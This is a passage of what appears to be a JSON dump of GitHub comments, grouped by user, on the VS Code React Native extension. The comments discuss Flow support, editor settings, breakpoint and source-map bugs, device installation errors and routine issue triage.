\"--scheme\", \"app-dev\",\n    \"--configuration\", \"Dev.Debug\"\n  ]\nI'll add support for both cases!. ",
    "billti": "Fix is out for review. See https://github.com/Microsoft/TypeScript/pull/7249#issuecomment-190297728\n. This is an issue with the types defined in the DefinitelyTyped repo (e.g. for the above see https://github.com/DefinitelyTyped/DefinitelyTyped/blob/types-2.0/react-native/index.d.ts#L3535 ). If someone wants to contribute better type definitions, that'd be awesome.\n. ",
    "zchrykng": "Any update on when this fix will be pushed out? Negates one of the most awesome features of VSCode, at least for my current project.\n. @egamma Awesome. Thanks! Installing now.\n. ",
    "egamma": "@zchrykng The fix is available in the latest VS Code insiders build. Pls see https://code.visualstudio.com/blogs/2016/02/01/introducing_insiders_build\nYou need to enable \"allowSyntheticDefaultImports\". This is the jsconfig.json:\njsconfig.json\njson\n {\n    \"compilerOptions\": {\n        \"allowSyntheticDefaultImports\": true\n    }\n}\n\n. This issue was moved to Microsoft/TypeScript#7275\n. @artyomtrityak actually, there is a flow extension for Code https://marketplace.visualstudio.com/items?itemName=flowtype.flow-for-vscode\nOne idea would be that you use this extension and then you map .js files as flow files in an extension. The extension would consist of this package.json only:\njson\n{\n    \"name\": \"js-is-flow\",\n    \"displayName\": \"JS is  Flow overwrite\",\n    \"description\": \"Overwrites the file mapping of java script files so that they are treated like flow files\",\n    \"version\": \"0.0.1\",\n    \"publisher\": \"eg2\",\n    \"engines\": {\n        \"vscode\": \"^0.10.x\"\n    },\n    \"categories\": [\n        \"Languages\"\n    ],\n    \"contributes\": {\n        \"languages\": [\n        {\n                \"id\": \"flow\",\n                \"aliases\": [\n                    \"Flow\"\n                ],\n                \"extensions\": [\n                    \".js\"\n                ]\n            }\n        ]\n    }\n}\nThis is a global change and treats .js files always as flow files.\n. @mroswald someone got flow working, please see this discussion https://github.com/Microsoft/vscode/issues/5214#issuecomment-209357738\n. @mroswald using the files association is now the recommended way. The package.json language contribution was more of a work around.\n. I was able to get Intellisense and diagnostics using the flow extension (see below).\n- installed the flow extension from the market place\n- added a .flowconfig file\n- associated .js files with the flow language in the user settings\njson\n{\n    \"files.associations\": {\n        \"*.js\": \"flow\"\n    }\n}\nVerified that the error message doesn't come from Salsa (it would have [js] as a prefix) and tried Intellisense.\n\n. I might be on an older version... \nFlow, a static type checker for JavaScript, version 0.18.1.\nI suggest to file issues against the flow extension if the problem persists.\nhttps://github.com/flowtype/flow-for-vscode\n. > in regular JS mode, IntelliSense for \"bar\" returns many more suggestions from JavaScript, so it still appears that the full IntelliSense is not available to the Flow extension. \nThis is by design, the JS mode adds suggestion based on type inference and since not all types can be inferred it also offers the global JS symbols. This is described here: https://code.visualstudio.com/docs/languages/javascript#_intellisense\n. > @julioolvr, this is a neat workaround but unfortunately seems to break ESLint highlights :(\nI assume the issue is that once the language mode is set to something else than JavaScript then the vscode-eslint extension no longer considers the file. I've filed an issue against vscode-eslint.\n. ",
    "icodethings": "This will be fixed with https://github.com/facebook/react-native/pull/6043\n. ",
    "mbraude": "Thanks @icodethings ! \n. Let's close this issue since the real issue is tracked in the vscode repo.\n. Chrome does not support this functionality.\n. Thanks @joewood - this change is in the repo and will go out in the next release.\n. @sercanov thanks for the feedback. We've copied this to our backlog and will get to it as soon as we can.\n. @sam-n-johnston we've tried reproing this several times but haven't been able to. I am going to close this. If you still have trouble, please reactivate and let us know so we can take another look.\n. @manoj-nama thank you for contributing!\n. I think this is a dupe of #273, so I am closing this. @jpgarcia, please let me know if that is not the case and I will re-open.\n. Hi @preetb123, thanks for reporting this! Is there any more information you can give us? We need to be able to repro this issue before we can do much more to help.\n. @preetb123 is this still an issue for you?\n. Hey @neilyoung, I'm sorry this experience isn't better. Unfortunately, Chrome does not allow multiple debuggers to attach to the same browser window. \n. We do have a backlog item to address this and allow RN projects outside the root.\n. @MSLaguana can you help get this PR checked in?\n. @vladimir-kotikov  was not able to repro this issue.\n. Thanks Vladimir! @TimBarham / @changsi-an can you two help review?\n. Hi @Marco62 , thanks for reporting this. What version of Node.js are you using?\n. Thanks for the update @Marco62 !\n. Yes - @vladimir-kotikov / @daserge, can one of you please take a look?\n. ",
    "symmetriccurve": "I'm killing the Packager process from the Activity Monitor-> node. But there should a better way to do this\n. The packager started from the VSCode\n. ",
    "Mokto": "Also having this issue.\nPlease note that sometimes, when passing through breakpoints, they also disappear from the editor. They are still internally here because if I reload simulator, they are being handled.\n. 1) No but there is an infinite loop with 2) and 3)\n2) Inside\n3) Receive good requests\n[4:35:43 PM] <START> request:/index.ios.bundle?platform=ios&dev=true\n[4:35:43 PM] <END>   request:/index.ios.bundle?platform=ios&dev=true (23ms)\n[4:35:43 PM] <START> request:/index.ios.map?platform=ios&dev=true\n[4:35:43 PM] <END>   request:/index.ios.map?platform=ios&dev=true (185ms)\n4) Yes. I got packager-status:running\n5) I can't access debugger, it is switching every second between theses two images :\n\n\nThanks !\n. Well when restarting my computer everything works fine.\nThanks for you reactivity and help !\nI will be opening more issues regarding breakpoints, it seems that it does not work very well with live reloading.\nBut one more time, thanks !\n. Ok I just created a PR because in my opinion it was not clear that we had to change \"target\" to \"device\".\nThere is one more error now :\nCannot debug application: Error while executing command 'ideviceinstaller -i /Users/theo/Projects/inprogress/showcase/ios/build/Build/Products/Debug-iphoneos/inProgress.app': spawn ideviceinstaller ENOENT\nSo I did brew brew install ideviceinstaller (I will add this to README) and now I get [vscode-react-native] [Error : 0706]  Cannot debug application: Cannot read property 'childProcess' of undefined \nAny idea ?\nThanks :)\n. Sorry, already done :(\n. I just discovered vs code + react-native plugin today, so right now I'm focusing on documentation. But I hope that I can help you soon ;)\n. ",
    "Gentlee": "also they often appear on the last line and can't be removed, issue with breakpoints is the worst one\n. ",
    "taypo": "Yes there was a message saying intelli sense has been enabled and I should restart vscode. But it kept popping up after every restart. And it went away when I set the var myself.\nIf it matters, I installed the extension while the project was already open in vscode.\n. I was on windows 7 enterprise. And it was reproducable. Each six member of my team had the same issue.\n. ",
    "artyomtrityak": "@egamma they are not going to fix this, React Native supports Flowtype from the box so i assume vscode react native plugin should support flowtype annotations. This is the only reason i am not using vscode right now\n. ",
    "mroswald": "@egamma does not work for me, js files as still detected as Javascript. I added the properties engines, categories and contributes to my package.json and restarted vs code. still no success. I also removed the // @flow comments from the top of the files. any clue?\n. @egamma setting this via package.json seems no longer available. but files to language assocations can now be done in user or workspace settings via \n\"files.associations\": {\n  \"*.js\": \"flow\"\n}\n. I'm not sure if that's really a bug. A non-existing file should be catched by the current version (I can't reproduce the steps) and invalid JSON can't be read... which is quite normal\n. something like that? https://github.com/Microsoft/vscode-react-native/compare/master...mroswald:feat/remove-manual-args-stripping\n. At least the console should tell me about that error, but for me (node 5.7) it does not. This changes fix that (on my machine): https://github.com/mroswald/vscode-react-native/commit/d11194f3e7ae89c7f6faecfc2c2716da2e7aec9c\nAnybody else can reproduce that?\nbefore: \n[vscode-react-native] [Error : 0101]  Cannot debug application: Error while executing command 'ideviceinstaller -i /Users/**/ios/build/Build/Products/Debug-iphoneos/**.app': spawn ideviceinstaller ENOENT\nafter:\n[vscode-react-native] [Error : 0201]  Cannot debug application: Unable to find ideviceinstaller. Please make sure to install Homebrew (http://brew.sh) and then 'brew install ideviceinstaller: Error while executing command 'ideviceinstaller -i /Users/**/ios/build/Build/Products/Debug-iphoneos/**.app': spawn ideviceinstaller ENOENT\n. @MSLaguana I know understand your text after reading the code :-)\nThe error is wrapped in a new NestedError in the CommandExecutor:\nprivate generateRejectionForCommand(command: string, reason: any): Q.Promise<void> {\n        return Q.reject<void>(ErrorHelper.getNestedError(reason, InternalErrorCode.CommandFailed, command));\n    }\nand the expected errorCode is numeric, so maybe this is the reason why this error is wrapped. In this case (<any>err).code === \"ENOENT\" can never be true. My suggestion would be:\nif ((<any>err).errorCode === 101 && (<any>err).innerError.code === \"ENOENT\") {\nI'm totally fine with wrapping these errors in understandable, well-formatted ones\n. @MSLaguana don't know how long this will take, uploaded the signed CLA an hour ago\n. @digeff thanks, I added your descriptions\n. @digeff also added the default value for logCatArguments\n. I fixed the typos and added the default for sourceMaps. Sry, was late last night in my timezone ;-)\nAnything left?\n. @digeff fixed\n. Just a short question aside: Which part does control the order in which the launch arguments are coming in? It's just a mess that the (vsc) extension relies on the correct order and count of parameters. Is there no better way to get them?\n. @guillaumejenkins thanks. I didn't care about linting since the functionality is not complete :-) I'll fix the issues soon\n. @MSLaguana thanks for your in-deep explanation. The reason why I want to change this, is that some React Native projects do not have a single \"ios\" folder, but a subfolder structure where one or more XCode projects live. The React Native cli got this feature with 0.24 (https://github.com/facebook/react-native/pull/6134).\n. @digeff @MSLaguana ah, sry :-) That's the point on which I'm struggling. In .vscode/.react/ there is no directory structure, so I'd have to create it. But then vs code does not map / finds the connection between source code and downloaded source + sourcemap. I'm not sure how this is supposed to work\n. Only index.ios.bundle and index.ios.map. I also tried to remove the path and just save them directly into this directory. That works so far, but the breakpoints are moved (when starting the debugging) from line x to something like line 32034 which is near the \"breakpointed\" module in the bundle (index.ios.js). Not sure what is responsible for matching/moving the breakpoints \n. Looks not that like these. What actually works is to set the breakpoint via \"debugger;\" statement. But then it stops inside the index.ios.bundle.\n. Ok, this is what the trace tells me:\n40513: _mapSourceAndUpdateBreakpoints: src: '/Users/mark/**/Examples/**/index.ios.js' 20:0 -> gen: '/Users/mark/**/.vscode/.react/index.ios.bundle' 37025:0\n40513: _mapSourceAndUpdateBreakpoints: src: '/Users/mark/**/Examples/**/index.ios.js' 32:0 -> gen: '/Users/mark/**/.vscode/.react/index.ios.bundle' 37037:0\n(I had to hide the project names here. /Users/mark/** is my project root, Examples is the directory which hosts the ios Projects)\n. Ok, so then this is view is telling me only the mapping?\n\nSecond: What does this _getStackFrame mean?\n41100: _mapSourceAndUpdateBreakpoints: src: '/Users/mark/**/Examples/**/index.ios.js' 20:0 -> gen: '/Users/mark/**/.vscode/.react/index.ios.bundle' 37025:0\n41100: _getStackFrame: gen: '/Users/mark/**/.vscode/.react/index.ios.bundle' 37037:4 -> src: '/Users/mark/**/Examples/**/index.ios.js' 32:0\n41100: _getStackFrame: gen: '/Users/mark/**/.vscode/.react/index.ios.bundle' 37044:1 -> src: '/Users/mark/**/Examples/**/index.ios.js' 39:0\nindex.ios.js has 35 lines in total.\nbtw: thanks for this overwhelming support! \n. Ok, I just tested a breakpoint in a file without JSX / without a react component. It's definitely related to transpiled jsx or react classes. Let me just clean my current code, then I'll push an update.\n. @digeff Ok, I refactored as you suggested (relative path)\n. @digeff anything left?\n. @digeff I rebased to current master, tests should pass now (fingerscrossed)\n. @digeff sorry, forgot one. Tested on simulator and iPhone with one project having ios in root folder and one having xcode project in subfolder\n. @digeff Is it possible to release a new version? There are bugs left on the milestone, but indeed the features are not usable until this bugs are fixed.\n. @MSLaguana I'm sorry that I can't tell you any details, but we're working with a framework that ships react-native and it's not intended to you have it directly in your dependencies. \n. @MSLaguana @digeff thanks! A great suggestion. I refactored the Helper and now it uses the react-native cli for checking if it's a react-native project and also changed the version-check to use it.\n. @PatoBeltran please have a look again. I was not sure how to get the output of the spawnReactCommand properly, so I used the ReadableStream from stdout - is there a better way?\n. @MSLaguana @PatoBeltran Do you want me to squash the commits?\n. @MSLaguana I did. Thanks for your support on that!\n. @MSLaguana I don't see ny conflict, but updated the branch to the current master\n. Thanks, I changed that\n. I do, this line only checks if there is a trailing \"ios/\" and removes it.\n. In my example, there are different SourceMaps provided. But you're right - Shall we change that to index\\.(android|ios)\\.map?\n. So better use !isNullOrUndefined here?\n. If the script body returns multiple sourceMappingUrl= then this error happens:\n[6:39:12 PM] <END>   request:/**/index.ios.bundle?platform=ios (67ms)\n[6:39:12 PM] <START> request:/exp.js.map\nError: Error validating module options: child \"platform\" fails because [\"platform\" must be a string]\n    at declareOpts.js:60:13\n    at index.js:222:20\n    at tryCallOne (/Users/mark/**/node_modules/promise/lib/core.js:37:12)\n    at /Users/mark/**/node_modules/promise/lib/core.js:123:15\n    at flush (/Users/mark/**/node_modules/asap/raw.js:50:29)\n    at _combinedTickCallback (node.js:370:9)\n    at process._tickCallback (node.js:401:11)\nbash\n$ grep \"sourceMappingURL=\" index.ios.bundle\n//# sourceMappingURL=exp.js.map\n//# sourceMappingURL=cldr.js.map\n//# sourceMappingURL=core.js.map\n//# sourceMappingURL=en.js.map\n//# sourceMappingURL=main.js.map\n//# sourceMappingURL=utils.js.map\n//# sourceMappingURL=es5.js.map\n//# sourceMappingURL=compiler.js.map\n//# sourceMappingURL=en.js.map\n//# sourceMappingURL=main.js.map\n//# sourceMappingURL=diff.js.map\n//# sourceMappingURL=es5.js.map\n//# sourceMappingURL=core.js.map\n//# sourceMappingURL=es5.js.map\n//# sourceMappingURL=memoizer.js.map\n//# sourceMappingURL=core.js.map\n//# sourceMappingURL=parser.js.map\n//# sourceMappingURL=index.ios.map\nThe  only source map of interest is the index.ios/android.map, right? Or should we trust that the correct one is the last match?\n. Ok, you're right. I'll investigate why we have multiple source maps in one body (maybe it's related to babel telling me [BABEL] Note: The code generator has deoptimised the styling of \"/Users/mark/**/node_modules/immutable/dist/immutable.js\" as it exceeds the max of \"100KB\". and remove this change from the PR\n. Ok, found it. This is an issues related to react-intl\nhttps://github.com/yahoo/react-intl/issues/71\n. I changed all findings where \"ios\" was added in code. Now it should be clean\n. right, that can be removed\n. @MSLaguana I hate this timezone difference :-) The React Native packager can serve multiple apps at a time, but vscode won't hande multiple apps concurrently (as all index.ios* maps will be stored at .vscode/.react/index.bundle.ios. I experimented with replacing the path separator /with _ but then the IDE didn't match anything. That's the part where I don't have a clue how that works. How does vscode map the source code to anything stored under .vscode/.react?\nBut - anyway. Just for the moment this will be an improvement (@digeff merge pls :-) ). I'm willing to drive this to the next level - in another PR, hopefully with your assistance.\n. Sorry, you're right\n. I didn't introduce the check for version 0.19 - shall I really remove that?\n. fixed that, nice idea\n. ",
    "prashaantt": "I've enabled Flow using the extension and mapped *.js to flow, as suggested. This makes VS Code no longer report errors, but this also means IntelliSense stops working.\nThis was the exact issue with .jsx earlier and it was resolved by allowing files using the JavaScript React language mode to be first class JavaScript citizens with TypeScript enabled. A similar solution that treats the Flow lang mode (as provided by the Flow extension) but without enforcing TypeScript checks and letting Flow take over would be the way to go. If I understand this correctly, this needs to happen inside Code itself rather than in the extension and perhaps by providing a new setting to disable TS validation for certain file types/language modes.\nMy personal use for Flow is exclusively with React which naturally works much better with Flow than TypeScript. Nuclide supports Flow out of the box, but I'm determined to stick with Code for all its other goodies. So I know it's probably too much to ask, but can you please make this happen @egamma? :)\n. I just don't know what you're doing differently, because all I get to see is this\n\nI've tested this in the latest Insiders and regular builds. Do you have anything inside your .flowconfig?\n. Can you please tell me the version of flow you have installed?\n. Thanks, and sorry for the bother. Yes, I've verified that this is an issue with newer versions of the extension itself.\nHowever, in regular JS mode, IntelliSense for \"bar\" returns many more suggestions from JavaScript, so it still appears that the full IntelliSense is not available to the Flow extension. Is that also a deficiency of the extension or something to do with Code itself?\n. ",
    "niedzielski": "Thanks for all the background on this issue! I believe the relevant issue mentioned in the extension is flowtype/flow-for-vscode/issues/13. Unfortunately, it seems that the suggested workaround breaks ESLint highlighting.\n. ",
    "faceyspacey": "any update on this?. ",
    "dudeinthemirror": "After installing VSCode 1.10.2, I had the same issue. Adding\njson\n    \"files.associations\": {\n        \"*.js\": \"flow\"\n    }\nto the user settings did not solve the issue, it made syntax highlighting go away.\nHowever when I took that out of settings and restarted the editor, Flow is working again properly.\n. ",
    "agrcrobles": "This is working for me having the following in settings.json.\n{\n    \"javascript.validate.enable\": false,\n    \"flow.useNPMPackagedFlow\": true\n}\nNote: I am using flow-for-vscode. Great it helped guys, I will add it to docs. . @vladimir-kotikov thanks for your feedback, yes, it is, I also added a reminder that the project root needs a .flowconfig file.. ",
    "dually8": "Thank you @agrcrobles, I've been messing with this for hours in an asp.net core application. FINALLY got it.. ",
    "rankun203": "Thanks @agrcrobles ! \nNote: Place those settings provided by @agrcrobles in $workspace/.vscode/settings.json will only effective in current project.. ",
    "dotbear": "Thank you so much @agrcrobles !. ",
    "jeantimex": "You are awesome @agrcrobles!. ",
    "ghost": "News on this?. @nitsujri This fix has already been released, you can update the extension by following these instructions.\nIf you want to install our latest then clone the repo, build with Gulp, and then copy the contents of the enlistment to your extension directory. Be sure to remove the preexisting extension first (.vscode/extensions/vsmobile.vscode-react-native-0.1.X).\n. :+1: \n. :+1: \n. :+1: \n. :+1: \n. :+1: \n. :+1: \n. :+1: \n. Can you please let us know the versions of VS Code and the react-native extension you're using?\n. Closing as this is an external issue related to the schema - it can be ignored or renamed as appropriate.\n. :+1: \n. Thanks for reporting @taypo - this is actually an issue with VS Code and not the react-native extension. I've opened a new issue with your info here: https://github.com/Microsoft/vscode/issues/4324\nFWIW - it does appear that the issue can be worked around by using multiple lines of text, e.g.\n<View style={styles.container}>\n    <Text style={styles.title}>\n        Don't\n    </Text>\n</View>\nI will be closing this issue - please continue to monitor the VS Code issue directly.\n. :+1: \n. :+1: \n. What OS are you using? How are you closing and restarting VS Code? On OS X in particular you will need to completely quit VS Code (Cmd+Q), not just the open window, but the app itself.\n. Closing due to lack of feedback, if you're still having this issue feel free to reopen the thread.\n. @lihuazhang what version of VS Code are you using? Are you completely exiting out of VS Code before restarting it (cmd+Q)?\n. Hi @JeandeCampredon, \nSorry you're having problems after the update. Can you verify a couple things:\nHow are you opening your project? Have you tried both:\n- opening vscode, then opening the root folder of your project\n- navigating to your project folder from a terminal window and opening the project with \"code .\"\nCan you inspect the settings.json file in your project's .vscode folder, what does it contain?\nLastly - can you share the path to your project folder (e.g. /Users/hamiltonia/Workspace/MyProject)? Does it contain any special characters, spaces, etc.?\n. Glad that it's working for some projects. \nDo you have a settings.json file under the project/.vscode directory? That file is most likely what's causing the error, either trying to read it, or writing it. With older versions of the extension we create this file to help with IntelliSense, with your version it shouldn't be needed but it may be causing problems.\n. The issue appears to be the default comment placed at the top of the settings.json. We're unable to parse the JSON while that's there, which results in an error and we fail to initialize. Strangely enough this doesn't repro in the latest insider build of VS Code. I will investigate what changed there, in the meanwhile the workaround is to simply remove that comment from your settings.\n. :+1: \n. :+1: \n. :+1: \n. :+1: \n. :+1: \n. :+1: \n. @zhonshu I have copied this issue to VS Code https://github.com/Microsoft/vscode/issues/5055\nPlease follow the issue there, I will be closing this issue as it's not directly controlled by the react-native extension.\n. Closing this due to lack of info, @XiSmartElf if you can provide more info please reactivate.\n. Thanks for the submission, much appreciated.\n. Hi @LzxHahaha - this is not an issue with the react-native extension, it is functionality provided by VSCode directly. It looks like this is currently unsupported, as referenced in: https://github.com/Microsoft/vscode/issues/1974\nIt's also open as a feature request here:\nhttps://github.com/Microsoft/TypeScript/issues/2103\nI'm closing this issue here as it's not related directly to the react-native extension, if you would like to follow up on the issue please work with the vscode team directly:\nhttps://github.com/Microsoft/vscode/issues\n. @joewood we don't currently have a solution for this, we'll need to spend some time looking at it. Currently the team is busy with some non-related work, we'll add this to our backlog and get back to it when we can.\n. Still facing that. ",
    "kunokdev": "By disabling, \"javascript.validate.enable\": false, what do we lose?\nThanks for solution tho @agrcrobles . ",
    "aMarCruz": "In flow files, nothing. Same issue here, behavior is erratic.\nVS Code: 1.21.0\nReact Native Tools: 0.6.4\nReact Native: v0.53.3\nReact Native Navigation: 1.1.407\nTypescript: 2.7.2\nGraddle plugin: 2.3.3\nAndroid Build Tools: 27.0.3, targetSdk 21\nOS: Linux Mint 18.3, x64, 16GB\n. Same here.\nRN 0.56.0\nVS Code 1.26.1\nRN-Tools 0.6.14\nLinux Mint 16.3\n...and the output of console.log is not visible in the \"DEBUG CONSOLE\" panel anymore :(. @ruslan-bikkinin , perhaps the isaacs' which utility is convenient for you:\n```js\nconst which = require('which')\n/*\n * Find the first instance of the adb executable in the PATH.\n * @returns the normalized path of adb, or null if not found.\n /\nfunction findAdbExec () {\n  return which.sync('adb', { nothrow: true })\n}\n``\nAlso, there'are the enviroment varsANDROID_HOMEandANDROID_SDK_ROOT`, but in any case we users can specify the path to the Android SDK in a VS Code settings.\n. @ruslan-bikkinin , I'm facing the same issue.\nI remember that 3 or 4 days before I updated my App to RN 0.57 and it worked perfect, after that I upgraded my Samsung Edge to Android 8 and a day later (cach\u00e9 cleared?) the debugger stopped working.\nThe only weird thing I've noticed is that what the output of console.log is shown in the OUTPUT panel and not in the debug panel. Enything else does not show nothing strange: logcat is working, I can open the Dev menu, etc. But I cannot set breakpoint and hot reloading not works, looks like the socket die.\nIn the other hand, my other device with Android 5.1 is working with issues, so I think this is a incompatibility of RN and Oreo. (btw: Flutter in Oreo works like a charm)\n. ",
    "MadeoIT": "@kunokdev you will lose javascript validation. I will try it for a bit, but IMHO is not a good solution.. ",
    "mgleason": "@MSLaguana - Apologies, after reading the 0.10.8 release notes I somehow assumed it was \"built-in\" as of 0.10.8.  Thanks for pointing it out!\nTo be fair, the first step in the Getting started could be changed to two steps:\n\n\nBe sure you're running VS Code 0.10.8+\nInstall the react-native extension: cmd-shift-p, type \"> ext install\", then type \"react-native\" and  select the react native tools preview\n  ...\n\n\nCurrently it reads:\n\nGetting started\n- Install the extension in VS Code (0.10.8+)\n- Run npm install -g react-native-cli to install React Native CLI (0.1.10+)\n- Set up React Native (0.19+) using the steps detailed on the React Native getting started documentation\n\n...\n. ",
    "kristianmandrup": "Awesome! I forgot I was working from a React/Redux web app template.\n. ",
    "maximovicd": "Hey there, I'm having a weird combination of these problems:\nI don't have any errors in Developer Tools console. I'm able to run React Native: Run Android from Command Palette. I got CLI installed globally only and react-native in app folder, and my launchReactNative.js is not generated and hitting start on debugger gets me the \"Unable to set up communication with VSCode react-native extension.\" error.\nI'm using RN 0.42.3.\nLet me know if you guys got any idea on what to try out to get debugging working on my side.. ",
    "Hatko": "After update to Version 1.30.0 (1.30.0) the file is disappeared and is not generated anymore. ",
    "ruslan-bikkinin": "Hi @Hatko technically, we don't need this file anymore for debugging, so don't be afraid, that's completely normal. We will get rid of its mentions in the future releases of the extension.. @transitive-bullshit what do you mean?. Hi @prudhviraju255, syntax highlighting as well as code hinting is not a part of React Native Tools extension anymore. I'd suggest you to file your question to vscode tracker.. Hi @khadkaPratik are you able to compile and run your React Native app via react-native run-ios?. @khadkaPratik please clarify can you compile and run project via react-native run-ios?. Hi @ILI4S \nPlease try to follow suggestion from here: https://github.com/Microsoft/vscode-react-native/issues/276#issuecomment-388339960. If it doesn't help you, please submit new issue.. Hi @JoseFMP, please submit separate issue, describing you specific case.. Hi @josemigallas extension isn't responsible for intelisense for React native anymore, I believe you better address this to vscode repo as now it manages typings stuff.. Hi @cubabit If you are using react-native-typescript-transformer then debugging should work out-of-the-box. If you are using some custom TS configuration for your project, please, use these instructions to make it work with the extension. \n. Hi @Kaybarax could you please submit separate issue describing your specific problem?. I am closing this due to a long inactivity. Feel free to re-open if needed.. I am closing this due to original issue has been resolved. If you are struggling with similar problem during debugging with expo, please, submit separate issue.. Hi @CrazzzyDev , @iTOYS  and @svekl are no longer maintain this repo. Could you please, submit new issue, describing your particular problem in details?. Hi @MikkelSnitker @jboulay @RaphyLi @CasDigital @edgebal @olegdizus \nI tried to reproduce this issue using clean RN app with rn-nodeify installed, but it was working for me without a problem. I believe to figure out what is the source of the problem we need more detailed steps to reproduce it on our side. Could please anyone from you, guys, prepare as much detailed as possible scenario including demo application and steps have led you to the error?. Hi guys. Looks like the cause of issue is the fact that rn-nodeify and react-native-tcp overrides global.process as @olegdizus mentioned recently and I don't see any solutions for this from our side. I suggest to turn to authors of those packages to propose a fix similar to this one https://github.com/Microsoft/vscode-react-native/issues/606#issuecomment-368841520. Anyway, if anybody has another thoughts about how this issue can be fixed from our side, please, let us know. I am closing this issue so far.. Hi @MrHubble unfortunately, I couldn't reproduce this issue but I noticed that in your Developer console output:\n\nvscode-node-debug2 is a crucial component of react-native debugging in extension so overwriting it with another one may be the cause of your issue. Could you please determine when and under what conditions this warning began to take place for your VS Code? Also please try to do the following:\n1. Remove ~/.vscode/extensions/vsmobile.vscode-react-native-*\n2. Download latest vscode build here: https://vscode-update.azurewebsites.net/1.21.1/darwin/stable, unzip it in your somewhere in your home directory and run\n3. Install latest vcode-react-native extension for it and try again to debug your application\nAlso let us know whether issue will still reproduce for this case.. Hi @MrHubble, did you try steps I suggested? Just a friendly ping on this.. Hi @afefer which version of Expo SDK are you using in your project? Does this issue reproduce on a blank project generated via Expo CLI/XDE? If it does please attach it.. Hi @jkooper please submit new issue describing your specific problem.. Hi @kashishgrover please double-check whether you open React Native based project not the directory on the upper/lower level of it.. Hi everyone, just want to clarify more about this error. If you see this, it means that something wrong happened when executing react-native run-ios or react-native run-android commands which debugger starts during the debug session to launch app. Debugger tries to analyze output that comes out from command and identify common problems that might take place using regex patterns. So most likely if you will try to run one of these commands outside of vscode it will fail as well. The root of the problem could be build problems (for example gradle can't find adb/sdk environment variable), react-native specific issues (bundler problems, occasional bugs connected to update to newer RN versions, etc), emulator problems (adb couldn't connect to emulator, emulator didn't started at all, etc) or some tricky environment issues. So general recommendations for such kind of problems are the following:\n1. Double-check that you are able to run react-native run-%platform% without any problems in terminal.\n2. Otherwise start debug session from scratch, wait until it stops and Unknown error: not all success patterns were matched is shown, then take a look into View -> Toggle Output ->React-native, View -> Toggle Output ->React-native: Run android or View -> Toggle Output ->React-native: Run ios (depends on your platform) and make sure that there is no weird stuff there.\nI am closing this issue for now. If you are still struggling with this error and have already tried the recommendations above, please, create a separate issue because there's a chance that yours is specific.. Hi everyone. \nTL;DR\nIt will be fixed in VS Code v1.24\nExplanation:\nThe cause of issue is a bug in vscode-chrome-debug-core package upon which built-in extension vscode-node-debug2 depends on, that we are using. Bug have fixed since v1.24.0 of vscode-node-debug2, but current latest version of it (which vscode is using) is v1.23.5. So in the next minor release of VS Code this issue should be fixed automatically.. Hi @dhalperi, as far as I know, new minor version of VS Code is being released at the first half of each month.. VS Code 1.24 has been released today and this issue has to be resolved now. I tested debugging using this version of VS Code and it worked like a charm, so I am closing this issue. \nPlease let us know whether you still experiencing such problem after VS Code update.. Hi @dxh9845 could you please submit a new issue including all the info from the issue template that could help us resolve your problem quicker? Also, please include answers for the following questions:\n Are you running a pure React Native project (not Expo, not using Haul packager)?\n Does your project use javascript or typescript? If it uses typescript, please, let us know how it has been configured for it.\n* If it is possible, please, attach demo project.. Hi @ivanromaniv so, are you using nodejs project, not React Native project? If you are, I believe, you should submit new issue in vscode repository instead as a better place for this.. I have locked conversation around this issue due to it's specific symptoms described in the first post. If you are experiencing the similar problem, please, submit a new issue for that.. Hi @AnitaVPN, please submit separated issue using our issue template so we could help you faster.. Hi @buiqtuan. As it was explained before, extension itself have no control over managing this and all we can advice here is to use workarounds or ignore this error. \nI have referenced this to the following issue in vscode repo: https://github.com/Microsoft/vscode/issues/49894 so I believe the better place for tracking status/leave feedback now is there.. Hi guys, I was able to reproduce it. I am working on a fix now so I'll keep you posted if there will be any news.. Well, after further investigation I figured that there was no real bug in my case - just a prolonged delay during extension work that led to timeout error on my machine. Anyway, I was able to reach \"Expo QR code\" step without errors using 0.6.3 version on a second try. \n@mtrivolli @nahuelhds could you please try to debug your app using this version and let me know whether it works?. @nahuelhds yes, you are right) just a typo.. @nahuelhds In this case I will try again tomorrow and give you exact steps I followed so you could point me what I am missing now.. @nahuelhds @mtrivolli Did you ran this command immediately after your project has opened? I was able to get Command reactNative.startExponenPackager not found if I did so but when I waited a little bit for extensions to be be loaded on the second try this message didn't appear.. Thanks guys, I finally could reproduce it and working on a fix now.. @mtrivolli @scolestock @nahuelhds I have made a fix for this: #655. Could you, guys, please take a look on it and check whether it works for you? To test the fixed version of extension please do the following:\n1. Uninstall current version of extension.\n2. Create build of extension from my branch using these commands:\ncd /your/preferred/directory\ngit clone https://github.com/ruslan-bikkinin/vscode-react-native.git\ncd vscode-react-native\ngit checkout remove-file-dependency\nnpm i -g gulp\nnpm i\nnpm i -g vsce\ngulp release\n\nInstall fixed version of extension by clicking Extensions -> ... -> Install from VSIX... and selecting /your/preferred/directory/vscode-react-native/vscode-react-native-0.6.3.vsix.\n\n. @nahuelhds oh, sorry for that. I forgot to mention that you need global vsce package installed too. I will update my previous message.. Yeah, guys, sorry for not mentioning that, but fix already in 0.6.4.. Hi @veedeo. I don't think this is the same issue. More likely it's related to https://github.com/Microsoft/vscode-react-native/issues/646.. Hi @jhalborg and thanks for your feedback. Fix for this already in PRs: https://github.com/Microsoft/vscode-react-native/pull/717. Could you please try it on your machine and let me know whether it helps you? To test it please do the following:\n1. Run these commands:\ngit clone git@github.com:ruslan-bikkinin/vscode-react-native.git\ncd vscode-react-native\ngit checkout fix-enoent-socket-error\nnpm i\n2. Open vscode-react-native directory in VS Code, click on Debug icon, then select Quick Launch Extension in drop down menu and run it.\n3. Wait for another instance of VS Code to be appeared (it will be named like Extension Development Host...), then open your project in it and try to reproduce issue.\nAlso, be aware that I have created separate issue https://github.com/Microsoft/vscode-react-native/issues/716 for this, so please don't hesitate to post your feedback there instead of this thread.. @sergey-akhalkov not exactly, this change makes extension to be activated if opened folder has any subfolder that has react-native package installed. Unfortunately, this approach doesn't work if user opens RN-project without node_modules directory. E.g. if user will execute npm i afterwards VS Code will not trace it and extension will be still unactivated - user will have to re-open project to activate the extension. Summarizing this I believe this approach doesn't suit our needs.. @max-mironov yes, I will take care of it on Monday.. Hi @Gremlin80 and @WHATSAF and thanks for submitting the issue. Does this issue behave the same as in https://github.com/Microsoft/vscode-react-native/issues/625 or there is something more specific here? Was this issue reproduced on the older versions of vscode-react-native and vsccode?. @Gremlin80 sorry for delay, I tried to reproduce it but with no success, so, yes, could you please share with me demo and repro steps?. Reproduction steps (moved from #667)\nActual Behavior\n\nAdd a button and define a event handler for onPress on \nPlace a breakpoint into the render method, \nPlace a breakpoint into the body of the 